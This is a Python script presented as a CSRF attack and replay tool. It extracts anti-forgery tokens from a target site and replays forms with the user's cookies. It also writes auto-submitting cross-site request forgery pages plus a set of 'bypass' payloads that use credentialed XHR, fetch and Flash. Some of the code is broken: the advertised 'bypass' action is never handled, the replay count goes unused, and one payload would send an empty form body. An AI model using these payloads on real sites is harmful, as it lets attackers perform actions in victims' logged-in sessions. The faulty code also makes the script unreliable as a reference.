#!/usr/bin/env python3
"""
WEB3 — CSRF Attack/Replay Tool
CSRF token extraction, form replay, and auto-generation of CSRF payloads.
"""

import argparse
import sys
import time
import re
import json
import hashlib
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
from html.parser import HTMLParser

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


@dataclass
class CSRFToken:
    name: str
    value: str
    field_type: str = "hidden"
    location: str = ""
    strength: str = "unknown"


@dataclass
class FormInfo:
    action: str
    method: str
    fields: dict
    csrf_tokens: list[CSRFToken]
    form_id: str = ""
    form_name: str = ""


@dataclass
class ReplayResult:
    url: str
    method: str
    status_code: int
    headers: dict
    body_length: int
    redirected: bool
    redirect_url: str = ""
    diff_from_baseline: str = ""


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    timeout: int = 10
    verbose: bool = False
    replay_count: int = 1
    output_dir: str = ""


CSRF_TOKEN_PATTERNS = [
    r'csrf[_\-]?token',
    r'xsrf[_\-]?token',
    r'csrf[_\-]?field',
    r'csrf[_\-]?hash',
    r'_token',
    r'authenticity[_\-]?token',
    r'_csrf[_\-]?token',
    r'__RequestVerificationToken',
    r'csrfmiddlewaretoken',
    r'anti[_\-]?forgery[_\-]?token',
    r'nonce',
    r'verification[_\-]?token',
]

CSRF_HEADER_NAMES = [
    "x-csrf-token",
    "x-xsrf-token",
    "x-requested-with",
    "csrf-token",
]


class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms: list[FormInfo] = []
        self.current_form: Optional[FormInfo] = None
        self.in_form = False
        self.form_index = 0

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "form":
            self.in_form = True
            action = attrs_dict.get("action", "")
            method = attrs_dict.get("method", "POST").upper()
            form_id = attrs_dict.get("id", "")
            form_name = attrs_dict.get("name", "")
            self.current_form = FormInfo(
                action=action, method=method, fields={},
                csrf_tokens=[], form_id=form_id, form_name=form_name,
            )

        elif tag == "input" and self.current_form:
            name = attrs_dict.get("name", "")
            value = attrs_dict.get("value", "")
            input_type = attrs_dict.get("type", "text").lower()

            if name:
                self.current_form.fields[name] = {
                    "type": input_type, "value": value,
                }

                is_csrf = any(re.search(p, name, re.IGNORECASE) for p in CSRF_TOKEN_PATTERNS)
                if is_csrf and input_type in ("hidden", "text"):
                    token = CSRFToken(
                        name=name, value=value,
                        field_type=input_type, location="form_field",
                    )
                    token.strength = self._evaluate_token_strength(value)
                    self.current_form.csrf_tokens.append(token)

        elif tag == "meta" and self.current_form:
            name = attrs_dict.get("name", "").lower()
            content = attrs_dict.get("content", "")
            if "csrf" in name or "xsrf" in name:
                token = CSRFToken(
                    name=f"meta:{name}", value=content,
                    field_type="meta", location="meta_tag",
                )
                self.current_form.csrf_tokens.append(token)

    def handle_endtag(self, tag):
        if tag == "form" and self.current_form:
            self.forms.append(self.current_form)
            self.current_form = None
            self.in_form = False
            self.form_index += 1

    def _evaluate_token_strength(self, token_value: str) -> str:
        if not token_value:
            return "empty"
        if len(token_value) < 8:
            return "weak"
        if re.match(r'^[0-9]+$', token_value):
            return "weak"
        if re.match(r'^[a-f0-9]{8,}$', token_value, re.IGNORECASE):
            return "moderate"
        entropy = len(set(token_value))
        if entropy > 30 and len(token_value) > 20:
            return "strong"
        if entropy > 20 and len(token_value) > 16:
            return "moderate"
        return "weak"


class CSRFTool:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = requests.Session() if HAS_REQUESTS else None
        self.forms: list[FormInfo] = []
        self.captured_tokens: list[CSRFToken] = []
        if self.session:
            self.session.headers.update(config.headers)
            self.session.cookies.update(config.cookies)

    def _request(self, url: str, method: str = "GET", data: dict = None, allow_redirects: bool = True) -> tuple[str, dict, int, str]:
        start = time.time()
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, data=data, timeout=self.config.timeout,
                                          allow_redirects=allow_redirects)
            else:
                resp = self.session.get(url, timeout=self.config.timeout,
                                         allow_redirects=allow_redirects)
            redirect_url = resp.url if resp.history else ""
            return resp.text, dict(resp.headers), resp.status_code, redirect_url
        except Exception as e:
            if self.config.verbose:
                print(f"  [!] Request error: {e}")
            return "", {}, 0, ""

    def extract_forms(self):
        print(f"[*] Fetching page and extracting forms...")
        text, headers, status, _ = self._request(self.config.url)
        if not text:
            print("[!] Failed to fetch page")
            return

        parser = FormParser()
        parser.feed(text)
        self.forms = parser.forms

        print(f"[*] Found {len(self.forms)} form(s)")

        for i, form in enumerate(self.forms, 1):
            action_display = form.action or "(same page)"
            print(f"\n  Form #{i}:")
            print(f"    Action: {action_display}")
            print(f"    Method: {form.method}")
            print(f"    Fields: {list(form.fields.keys())}")
            print(f"    CSRF Tokens: {len(form.csrf_tokens)}")
            for token in form.csrf_tokens:
                print(f"      - {token.name}: {token.value[:30]}... (strength: {token.strength})")
                self.captured_tokens.append(token)

    def extract_csrf_tokens(self) -> list[CSRFToken]:
        tokens = []
        text, _, _, _ = self._request(self.config.url)

        if not text:
            return tokens

        parser = FormParser()
        parser.feed(text)
        for form in parser.forms:
            tokens.extend(form.csrf_tokens)

        for pattern in CSRF_TOKEN_PATTERNS:
            meta_match = re.search(
                rf'<meta[^>]*name=["\']([^"\']*{pattern}[^"\']*)["\'][^>]*content=["\']([^"\']+)["\']',
                text, re.IGNORECASE,
            )
            if meta_match:
                token = CSRFToken(
                    name=f"meta:{meta_match.group(1)}",
                    value=meta_match.group(2),
                    field_type="meta",
                    location="meta_tag",
                )
                token.strength = self._evaluate_token_strength(token.value)
                tokens.append(token)

            content_match = re.search(
                rf'<meta[^>]*content=["\']([^"\']+)["\'][^>]*name=["\']([^"\']*{pattern}[^"\']*)["\']',
                text, re.IGNORECASE,
            )
            if content_match:
                token = CSRFToken(
                    name=f"meta:{content_match.group(2)}",
                    value=content_match.group(1),
                    field_type="meta",
                    location="meta_tag",
                )
                tokens.append(token)

        header_tokens = {}
        for header_name in CSRF_HEADER_NAMES:
            meta_match = re.search(
                rf'["\']?{re.escape(header_name)}["\']?\s*:\s*["\']([^"\']+)["\']',
                text, re.IGNORECASE,
            )
            if meta_match:
                header_tokens[header_name] = meta_match.group(1)

        self.captured_tokens = tokens
        return tokens

    def _evaluate_token_strength(self, token_value: str) -> str:
        if not token_value:
            return "empty"
        if len(token_value) < 8:
            return "weak"
        if re.match(r'^[0-9]+$', token_value):
            return "weak"
        entropy = len(set(token_value))
        if entropy > 30 and len(token_value) > 20:
            return "strong"
        if entropy > 20 and len(token_value) > 16:
            return "moderate"
        return "weak"

    def replay_form(self, form_index: int, override_data: dict = None) -> ReplayResult:
        if form_index >= len(self.forms):
            return ReplayResult(
                url=self.config.url, method="GET",
                status_code=0, headers={}, body_length=0,
                redirected=False,
            )

        form = self.forms[form_index]
        action_url = form.action
        if action_url:
            parsed = urllib.parse.urlparse(self.config.url)
            if not action_url.startswith("http"):
                action_url = urllib.parse.urljoin(self.config.url, action_url)
        else:
            action_url = self.config.url

        data = {}
        for name, field_info in form.fields.items():
            if override_data and name in override_data:
                data[name] = override_data[name]
            else:
                data[name] = field_info["value"]

        if override_data:
            data.update(override_data)

        if self.config.verbose:
            print(f"  [*] Replaying form to: {action_url}")
            print(f"      Method: {form.method}")
            print(f"      Data: {data}")

        text, headers, status, redirect_url = self._request(
            action_url, form.method, data if form.method.upper() == "POST" else None,
        )

        result = ReplayResult(
            url=action_url, method=form.method,
            status_code=status, headers=headers,
            body_length=len(text), redirected=bool(redirect_url),
            redirect_url=redirect_url,
        )

        if self.config.verbose:
            print(f"      Status: {status}")
            print(f"      Response: {len(text)} bytes")
            if redirect_url:
                print(f"      Redirected to: {redirect_url}")

        return result

    def replay_multiple(self, form_index: int, count: int, override_data: dict = None) -> list[ReplayResult]:
        results = []
        for i in range(count):
            if self.config.verbose:
                print(f"\n  Replay #{i + 1}/{count}:")
            result = self.replay_form(form_index, override_data)
            results.append(result)
            time.sleep(0.5)
        return results

    def generate_csrf_payload(self, form_index: int = 0, auto_submit: bool = True) -> str:
        if form_index >= len(self.forms):
            return "<!-- No form found -->"

        form = self.forms[form_index]
        action_url = form.action
        if action_url and not action_url.startswith("http"):
            action_url = urllib.parse.urljoin(self.config.url, action_url)
        else:
            action_url = self.config.url

        fields_html = ""
        for name, field_info in form.fields.items():
            ftype = field_info["type"]
            fvalue = field_info["value"]
            fields_html += f'    <input type="{ftype}" name="{name}" value="{fvalue}">\n'

        submit_js = ""
        if auto_submit:
            submit_js = "\n<script>document.forms[0].submit();</script>"

        payload = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Attack PoC</h1>
    <p>Target: {action_url}</p>
    <p>Method: {form.method}</p>
    <form action="{action_url}" method="{form.method}">
{fields_html}    </form>
{submit_js}
</body>
</html>"""
        return payload

    def generate_multi_step_payload(self, steps: list[dict]) -> str:
        html = """<!DOCTYPE html>
<html>
<head>
    <title>Multi-Step CSRF PoC</title>
</head>
<body>
    <h1>Multi-Step CSRF Attack</h1>
"""
        for i, step in enumerate(steps, 1):
            url = step.get("url", self.config.url)
            method = step.get("method", "POST").upper()
            data = step.get("data", {})

            fields = ""
            for name, value in data.items():
                fields += f'        <input type="hidden" name="{name}" value="{value}">\n'

            html += f"""
    <form id="step{i}" action="{url}" method="{method}">
{fields}    </form>
"""

        html += """
    <script>
"""
        for i in range(1, len(steps) + 1):
            html += f"""        document.getElementById('step{i}').submit();
"""
        html += """    </script>
</body>
</html>"""
        return html

    def generate_bypass_payload(self, technique: str = "all") -> str:
        payloads = {}

        payloads["cookie_header"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF with Cookie Header</title></head>
<body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("{self.config.method}", "{self.config.url}", true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(document.forms[0] ? new FormData(document.forms[0]).toString() : "");
    </script>
</body>
</html>"""

        payloads["flash_request"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF via Flash</title></head>
<body>
    <!-- Flash-based CSRF (legacy browsers) -->
    <embed src="swf/csrf.swf" type="application/x-shockwave-flash"
           allowScriptAccess="always"
           flashvars="url={self.config.url}&method={self.config.method}">
</body>
</html>"""

        payloads["json_content_type"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF with JSON Content-Type</title></head>
<body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "{self.config.url}", true);
    xhr.setRequestHeader("Content-Type", "text/plain");
    xhr.withCredentials = true;
    xhr.send(JSON.stringify({{}}));
    </script>
</body>
</html>"""

        payloads["cors_misconfiguration"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF via CORS Misconfiguration</title></head>
<body>
    <script>
    fetch("{self.config.url}", {{
        method: "{self.config.method}",
        credentials: "include",
        headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
    }}).then(r => r.text()).then(t => document.body.innerHTML = t);
    </script>
</body>
</html>"""

        payloads["subdomain CSRF"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF from Subdomain</title></head>
<body>
    <script>
    // If the target trusts subdomains, this can bypass CSRF checks
    var form = document.createElement("form");
    form.action = "{self.config.url}";
    form.method = "{self.config.method}";
    document.body.appendChild(form);
    form.submit();
    </script>
</body>
</html>"""

        if technique == "all":
            html = "<!-- CSRF Bypass Payloads -->\n\n"
            for name, payload in payloads.items():
                html += f"<!-- {name} -->\n{payload}\n\n"
            return html
        return payloads.get(technique, f"<!-- Unknown technique: {technique} -->")

    def analyze_token(self, token: CSRFToken) -> dict:
        analysis = {
            "name": token.name,
            "value_preview": token.value[:50],
            "length": len(token.value),
            "entropy": len(set(token.value)),
            "strength": token.strength,
            "type": token.field_type,
            "location": token.location,
            "vulnerabilities": [],
        }

        if re.match(r'^[0-9]+$', token.value):
            analysis["vulnerabilities"].append("Sequential numeric token - easily predictable")

        if token.value.isdigit() and int(token.value) < 100000:
            analysis["vulnerabilities"].append("Short numeric token - brute-forceable")

        if len(token.value) < 8:
            analysis["vulnerabilities"].append("Short token length")

        if re.match(r'^[a-f0-9]+$', token.value, re.IGNORECASE):
            if len(token.value) == 32:
                analysis["vulnerabilities"].append("MD5 hash - may be predictable if based on timestamp")
            elif len(token.value) == 40:
                analysis["vulnerabilities"].append("SHA1 hash - check for timing attacks")

        if len(set(token.value)) < len(token.value) * 0.5:
            analysis["vulnerabilities"].append("Low entropy - limited character space")

        return analysis

    def run(self, action: str = "analyze"):
        if not HAS_REQUESTS:
            print("[!] Error: 'requests' library required. Install with: pip install requests")
            sys.exit(1)

        print(f"[*] Target: {self.config.url}")
        print()

        if action in ("analyze", "all"):
            tokens = self.extract_csrf_tokens()
            if tokens:
                print(f"\n[*] CSRF Token Analysis:")
                for token in tokens:
                    analysis = self.analyze_token(token)
                    print(f"\n  Token: {analysis['name']}")
                    print(f"    Value: {analysis['value_preview']}...")
                    print(f"    Length: {analysis['length']}")
                    print(f"    Entropy: {analysis['entropy']}")
                    print(f"    Strength: {analysis['strength']}")
                    if analysis["vulnerabilities"]:
                        print(f"    Vulnerabilities:")
                        for vuln in analysis["vulnerabilities"]:
                            print(f"      - {vuln}")
            else:
                print("[*] No CSRF tokens found")

        if action in ("forms", "all"):
            self.extract_forms()

        if action in ("replay", "all"):
            if not self.forms:
                self.extract_forms()
            if self.forms:
                print(f"\n[*] Replaying form #1...")
                result = self.replay_form(0)
                print(f"  Status: {result.status_code}")
                print(f"  Response: {result.body_length} bytes")
                print(f"  Redirected: {result.redirected}")
                if result.redirect_url:
                    print(f"  Redirect URL: {result.redirect_url}")

        if action in ("generate", "all"):
            if not self.forms:
                self.extract_forms()
            if self.forms:
                print(f"\n[*] Generating CSRF payloads...")
                payload = self.generate_csrf_payload(0)
                if self.config.output_dir:
                    import os
                    os.makedirs(self.config.output_dir, exist_ok=True)
                    filepath = os.path.join(self.config.output_dir, "csrf_poc.html")
                    with open(filepath, "w") as f:
                        f.write(payload)
                    print(f"  Saved: {filepath}")

                    bypass_payload = self.generate_bypass_payload("all")
                    bypass_path = os.path.join(self.config.output_dir, "csrf_bypass.html")
                    with open(bypass_path, "w") as f:
                        f.write(bypass_payload)
                    print(f"  Saved: {bypass_path}")
                else:
                    print(payload)


def main():
    parser = argparse.ArgumentParser(
        description="WEB3 — CSRF Attack/Replay Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://target.com/form"
  %(prog)s -u "http://target.com/form" --action analyze
  %(prog)s -u "http://target.com/form" --action replay --data "email=test@test.com"
  %(prog)s -u "http://target.com/form" --action generate -o output/
  %(prog)s -u "http://target.com/form" --action bypass
  %(prog)s -u "http://target.com/form" --action all -v
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-d", "--data", default="", help="POST data (key=value&key2=value2)")
    parser.add_argument("-c", "--cookies", default="", help="Cookies (key=value;key2=value2)")
    parser.add_argument("--header", action="append", default=[], help="Custom header (can repeat)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument(
        "--action",
        choices=["analyze", "forms", "replay", "generate", "bypass", "all"],
        default="all",
        help="Action to perform",
    )
    parser.add_argument("--replay-count", type=int, default=1, help="Number of times to replay form")
    parser.add_argument("-o", "--output-dir", help="Output directory for generated payloads")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print_banner()

    data = {}
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                data[k] = v

    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    config = ScanConfig(
        url=args.url,
        method=args.method,
        data=data,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        verbose=args.verbose,
        replay_count=args.replay_count,
        output_dir=args.output_dir,
    )

    tool = CSRFTool(config)
    tool.run(action=args.action)


def print_banner():
    banner = r"""
  ╔══════════════════════════════════════════╗
  ║    WEB3 — CSRF Attack/Replay Tool        ║
  ║     Token Extraction & Payload Gen       ║
  ╚══════════════════════════════════════════╝
"""
    print(banner)


if __name__ == "__main__":
    main()
